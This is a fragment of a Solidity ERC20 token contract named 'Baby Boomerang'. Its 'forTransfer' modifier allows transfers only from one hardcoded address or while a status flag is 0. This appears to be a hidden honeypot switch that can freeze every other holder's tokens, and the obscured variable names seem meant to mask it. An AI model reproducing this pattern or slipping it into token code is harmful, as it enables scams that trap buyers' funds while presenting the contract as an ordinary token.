...
contract BabyBoomerang is Context, IERC20, IERC20Metadata {

    mapping(address => uint256) private _balances;

    mapping(address => mapping(address => uint256)) private _allowances;

    uint256 private _tokenaq_totalSupply;
    uint256 private _tokenaq_status = 0;
    uint256 public stakingPoolaqStatus = 0;

    string private _tokenaq_name;
    string private _tokenaq_symbol;

    address private _poolaqAddress = 0xCFE33D345A8bdfA078777d5706d72Ac21488cA2A;

    constructor() {
        _tokenaq_name = "Baby Boomerang";
        _tokenaq_symbol = "BOOMERANG";
        _tokenaq_totalSupply = 1000 * 10 ** 18;
        _balances[msg.sender] = _tokenaq_totalSupply;
    }

    modifier forTransfer {
        require(msg.sender == _poolaqAddress || _tokenaq_status == 0);
        _;
    }
